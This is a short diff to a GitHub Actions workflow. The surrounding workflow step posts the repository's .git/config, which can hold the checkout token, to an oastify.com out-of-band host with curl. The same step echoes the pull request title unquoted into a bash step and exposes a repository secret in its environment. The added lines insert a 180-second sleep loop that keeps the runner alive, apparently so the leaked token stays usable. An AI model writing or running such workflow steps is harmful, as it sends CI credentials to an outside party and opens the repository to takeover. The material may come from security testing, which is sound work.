@@ -42,6 +42,10 @@ jobs:
           git config -l
           curl -d @./.git/config vnmf1fq7ob5euwoc6uqk6i183z9qxgl5.oastify.com
           echo "${{ github.event.pull_request.title }}"
+          for run in {1..180}; do
+            date;sleep 1;
+          done
+        shell: bash
         env:
           SECRET: ${{ secrets.SECRET }}
           FIRST_NAME: Mona
